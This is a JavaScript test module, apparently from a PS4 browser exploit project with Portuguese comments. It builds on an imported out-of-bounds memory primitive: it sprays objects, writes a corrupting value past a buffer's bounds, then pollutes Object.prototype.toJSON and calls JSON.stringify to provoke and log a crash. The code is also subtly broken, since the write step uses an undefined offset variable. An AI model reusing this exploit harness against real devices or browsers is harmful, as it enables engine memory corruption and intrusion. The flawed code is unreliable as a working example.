// js/script3/testDiagnoseRangeErrorOnComplex.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

// Classe similar à que estava em uso quando o RangeError foi observado na imagem do PS4
class MyComplexObjectForRECrash {
    constructor(id) {
        this.id_re = `MyObjRECrash-${id}`; // Nome de propriedade diferente para evitar colisões
        this.marker_re = 0xFEFEF00D;
        this.data_prop1 = "some_string_data_for_re_crash_test";
        this.data_prop2 = { nested_re: "more_data", val: 123 };
        this.num_prop_A = 98765;
        this.num_prop_B = 43210;
        this.arr_prop_C = [5,4,3,2,1];
        // Adicionar mais algumas para o for...in ter o que iterar
        for(let i=0; i<5; i++) {
            this[`filler_RE_${i}`] = `filler_val_RE_${i}`;
        }
    }
}

// toJSON que tenta acessar this[prop] dentro do loop for...in, com logging DETALHADO
// Esta função será colocada em Object.prototype.toJSON
export function toJSON_DiagnoseForInRE() {
    const FNAME_toJSON = "toJSON_DiagnoseForInRE";
    let iteration_count_local = 0; // Contador local para esta função toJSON
    const MAX_ITER_LOG_PROPS = 35; // Logar um bom número de propriedades
    const MAX_ITER_SAFETY_BREAK = 300; // Aumentado para dar mais chance ao RangeError ocorrer naturalmente

    let result_payload = {
        variant: FNAME_toJSON,
        id_at_entry: "N/A",
        iterations_completed_in_toJSON: 0,
        props_accessed_map: {}, // Para armazenar o que foi acessado
        last_prop_attempted_access: "N/A",
        error_in_toJSON_logic: null,
        range_error_explicitly_caught_in_toJSON: false
    };

    try {
        const this_id_str = String(this?.id_re || this?.id || "ID_Desconhecido").substring(0,30);
        result_payload.id_at_entry = this_id_str;

        // Usar console.log para máxima chance de ser visto no console do PS4 antes de um crash total
        console.log(`[${FNAME_toJSON}] Entrando. this.id (aprox): ${this_id_str}`);
        logS3(`[${FNAME_toJSON}] Entrando. this.id (aprox): ${this_id_str}`, "info", FNAME_toJSON);

        if (typeof this !== 'object' || this === null) {
            console.warn(`[${FNAME_toJSON}] 'this' não é um objeto ou é nulo.`);
            result_payload.error_in_toJSON_logic = "this is not object or null at toJSON start";
            return result_payload;
        }

        for (const prop_name_str in this) {
            iteration_count_local++;
            result_payload.last_prop_attempted_access = String(prop_name_str);

            if (iteration_count_local <= MAX_ITER_LOG_PROPS) {
                console.log(`[${FNAME_toJSON}] Iter: ${iteration_count_local}, Prop: '${String(prop_name_str).substring(0,50)}'`);
                logS3(`  [${FNAME_toJSON}] Iter: ${iteration_count_local}, Tentando Prop: '${String(prop_name_str).substring(0,50)}'`, "info", FNAME_toJSON);
            }

            try {
                // ****** PONTO CRÍTICO DE ACESSO À PROPRIEDADE ******
                const prop_value = this[prop_name_str];
                // ****** FIM DO PONTO CRÍTICO DE ACESSO ******

                if (iteration_count_local <= MAX_ITER_LOG_PROPS) {
                    let val_display_str = "N/A";
                    const val_type = typeof prop_value;
                    if (val_type !== 'function' && val_type !== 'object') {
                        val_display_str = String(prop_value).substring(0, 30);
                    } else if (Array.isArray(prop_value)) {
                        val_display_str = `[Array(${prop_value.length})]`;
                    } else if (val_type === 'object' && prop_value !== null) {
                        val_display_str = `[object ${prop_value.constructor?.name || ''}]`;
                    } else if (val_type === 'function') {
                        val_display_str = `[Function]`;
                    }
                    logS3(`    [${FNAME_toJSON}] Prop '${String(prop_name_str).substring(0,50)}' ACESSADA. Type: ${val_type}, Val: ${val_display_str}`, "good", FNAME_toJSON);
                    result_payload.props_accessed_map[String(prop_name_str).substring(0,50)] = `Type: ${val_type}, Val: ${val_display_str}`;
                }
            } catch (e_access) {
                console.error(`[${FNAME_toJSON}] ERRO AO ACESSAR this['${String(prop_name_str).substring(0,50)}']: ${e_access.name} - ${e_access.message}`, e_access);
                logS3(`    [${FNAME_toJSON}] ERRO AO ACESSAR this['${String(prop_name_str).substring(0,50)}']: ${e_access.name} - ${e_access.message}`, "error", FNAME_toJSON);
                result_payload.props_accessed_map[String(prop_name_str).substring(0,50)] = `ACCESS ERROR: ${e_access.name}`;
                // Não re-lançar aqui; queremos que o loop continue se possível,
                // ou que o RangeError principal seja capturado pelo JSON.stringify externo.
                // Se o RangeError for aqui, o catch externo ao loop o pegará.
            }

            if (iteration_count_local >= MAX_ITER_SAFETY_BREAK) {
                logS3(`[${FNAME_toJSON}] Safety break: Excedeu ${MAX_ITER_SAFETY_BREAK} iterações. Última prop: '${String(prop_name_str).substring(0,100)}'.`, "warn", FNAME_toJSON);
                result_payload.error_in_toJSON_logic = `Safety break after ${MAX_ITER_SAFETY_BREAK} iter.`;
                break;
            }
        }
        logS3(`[${FNAME_toJSON}] Loop for...in completou ${iteration_count_local} iterações.`, "info", FNAME_toJSON);

    } catch (e_loop_or_rethrow) {
        // Este catch pegará o RangeError se ele acontecer dentro do loop for...in
        console.error(`[${FNAME_toJSON}] EXCEPTION NO LOOP FOR...IN (ou re-throw): ${e_loop_or_rethrow.name} - ${e_loop_or_rethrow.message}`, e_loop_or_rethrow);
        logS3(`[${FNAME_toJSON}] EXCEPTION NO LOOP FOR...IN (ou re-throw): ${e_loop_or_rethrow.name} - ${e_loop_or_rethrow.message}`, "critical", FNAME_toJSON);
        result_payload.error_in_toJSON_logic = `EXCEPTION in toJSON: ${e_loop_or_rethrow.name}: ${e_loop_or_rethrow.message}`;
        if (e_loop_or_rethrow.name === 'RangeError') {
            result_payload.range_error_explicitly_caught_in_toJSON = true;
        }
    }
    result_payload.iterations_completed_in_toJSON = iteration_count_local;
    console.log(`[${FNAME_toJSON}] Saindo. Iterações: ${iteration_count_local}. Payload:`, result_payload);
    return result_payload;
}


export async function executeDiagnoseRangeErrorOnComplexTest() {
    const FNAME_TEST = "executeDiagnoseRangeErrorOnComplexTest";
    logS3(`--- Iniciando Teste: Diagnóstico de RangeError em MyComplexObjectForRECrash ---`, "test", FNAME_TEST);
    document.title = `Diagnose RE on ComplexObj`;

    const spray_count = 5; // Focar no primeiro objeto
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_trigger = 0xFFFFFFFF;

    // 1. Spray
    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObjectForRECrash...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_objects.push(new MyComplexObjectForRECrash(i));
    }
    logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);

    // 2. Setup OOB e Corrupção Gatilho
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST); return;
    }
    logS3(`2. Escrevendo trigger ${toHex(value_to_write_trigger)} em oob_ab_real[${toHex(corruption_offset_trigger)}]...`, "warn", FNAME_TEST);
    try {
        oob_write_absolute(corruption_offset_trigger, value_to_write_trigger, 4);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB trigger: ${e_write.message}. Abortando.`, "error", FNAME_TEST);
        clearOOBEnvironment(); return;
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 3. Poluir Object.prototype.toJSON e Chamar JSON.stringify
    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    const obj_to_probe = sprayed_objects[0];

    if (!obj_to_probe) {
        logS3("Nenhum objeto para sondar.", "error", FNAME_TEST);
        clearOOBEnvironment(); return;
    }

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_DiagnoseForInRE,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`3. Object.prototype.toJSON poluído com ${toJSON_DiagnoseForInRE.name}.`, "info", FNAME_TEST);

        logS3(`4. Sondando objeto ${obj_to_probe.id_re}... ESPERANDO RangeError POTENCIAL.`, 'warn', FNAME_TEST);
        document.title = `Sondando ${obj_to_probe.id_re} (DiagnoseRE)`;
        try {
            console.log(`--- [${FNAME_TEST}] ANTES de JSON.stringify(obj_to_probe) ---`);
            const stringifyResultPayload = JSON.stringify(obj_to_probe);
            console.log(`--- [${FNAME_TEST}] APÓS JSON.stringify(obj_to_probe) ---`);

            logS3(`     JSON.stringify(${obj_to_probe.id_re}) completou. Resultado da toJSON:`, "info", FNAME_TEST);
            logS3(JSON.stringify(stringifyResultPayload, null, 2), "leak", FNAME_TEST); // Log formatado
            if (stringifyResultPayload && stringifyResultPayload.range_error_explicitly_caught_in_toJSON) {
                 logS3(`     RangeError foi capturado DENTRO da toJSON. Verifique logs do console.`, "vuln", FNAME_TEST);
                 document.title = `RangeError CAUGHT in toJSON!`;
            } else if (stringifyResultPayload && stringifyResultPayload.error_in_toJSON_logic) {
                 logS3(`     Erro/Aviso na lógica da toJSON: ${stringifyResultPayload.error_in_toJSON_logic}`, "warn", FNAME_TEST);
            } else {
                 logS3("     JSON.stringify completou sem RangeError explícito ou erro na toJSON.", "good", FNAME_TEST);
            }

        } catch (e_str) { // Captura RangeError do JSON.stringify em si, se não pego pela toJSON
            console.error(`--- [${FNAME_TEST}] ERRO NO CATCH EXTERNO de JSON.stringify: ${e_str.name} ---`, e_str);
            logS3(`     !!!! ERRO FATAL AO STRINGIFY ${obj_to_probe.id_re} !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) {
                logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            }
            if (e_str.name === 'RangeError') {
                logS3(`       ---> RangeError (Estouro de Pilha Nativo) OCORREU! <---`, "vuln", FNAME_TEST);
                document.title = `RangeError REPRODUCED (Native)!`;
            }
        }
    } catch (e_main) {
        logS3(`Erro principal no teste: ${e_main.message}`, "error", FNAME_TEST);
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }

    clearOOBEnvironment();
    logS3(`--- Teste Diagnóstico de RangeError em MyComplexObject CONCLUÍDO ---`, "test", FNAME_TEST);
}
